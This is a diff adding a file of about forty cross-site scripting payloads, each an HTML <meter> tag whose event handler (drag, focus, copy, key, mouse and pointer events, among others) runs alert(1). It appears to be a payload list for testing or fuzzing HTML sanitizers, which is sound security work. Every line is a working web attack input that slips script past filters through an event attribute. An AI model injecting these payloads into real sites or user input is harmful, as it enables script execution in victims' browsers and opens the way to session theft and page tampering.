@@ -1,0 +1,43 @@
+<meter draggable="true" ondrag="alert(1)">test</meter>
+<meter draggable="true" ondragend="alert(1)">test</meter>
+<meter draggable="true" ondragenter="alert(1)">test</meter>
+<meter draggable="true" ondragleave="alert(1)">test</meter>
+<meter draggable="true" ondragstart="alert(1)">test</meter>
+<meter id=x tabindex=1 onactivate=alert(1)></meter>
+<meter id=x tabindex=1 onbeforeactivate=alert(1)></meter>
+<meter id=x tabindex=1 onbeforedeactivate=alert(1)></meter><input autofocus>
+<meter id=x tabindex=1 ondeactivate=alert(1)></meter><input id=y autofocus>
+<meter id=x tabindex=1 onfocus=alert(1)></meter>
+<meter id=x tabindex=1 onfocusin=alert(1)></meter>
+<meter onafterscriptexecute=alert(1)><script>1</script>
+<meter onbeforecopy="alert(1)" contenteditable>test</meter>
+<meter onbeforecut="alert(1)" contenteditable>test</meter>
+<meter onbeforepaste="alert(1)" contenteditable>test</meter>
+<meter onbeforescriptexecute=alert(1)><script>1</script>
+<meter onblur=alert(1) tabindex=1 id=x></meter><input autofocus>
+<meter onclick="alert(1)">test</meter>
+<meter oncontextmenu="alert(1)">test</meter>
+<meter oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<meter oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<meter ondblclick="alert(1)" autofocus tabindex=1>test</meter>
+<meter onfocusout=alert(1) tabindex=1 id=x></meter><input autofocus>
+<meter onkeydown="alert(1)" contenteditable>test</meter>
+<meter onkeypress="alert(1)" contenteditable>test</meter>
+<meter onkeyup="alert(1)" contenteditable>test</meter>
+<meter onmousedown="alert(1)">test</meter>
+<meter onmouseenter="alert(1)">test</meter>
+<meter onmouseleave="alert(1)">test</meter>
+<meter onmousemove="alert(1)">test</meter>
+<meter onmouseout="alert(1)">test</meter>
+<meter onmouseover="alert(1)">test</meter>
+<meter onmouseup="alert(1)">test</meter>
+<meter onmousewheel=alert(1)>requires scrolling
+<meter onpaste="alert(1)" contenteditable>test</meter>
+<meter onpointerdown=alert(1)>XSS</meter>
+<meter onpointerenter=alert(1)>XSS</meter>
+<meter onpointerleave=alert(1)>XSS</meter>
+<meter onpointermove=alert(1)>XSS</meter>
+<meter onpointerout=alert(1)>XSS</meter>
+<meter onpointerover=alert(1)>XSS</meter>
+<meter onpointerrawupdate=alert(1)>XSS</meter>
+<meter onpointerup=alert(1)>XSS</meter>
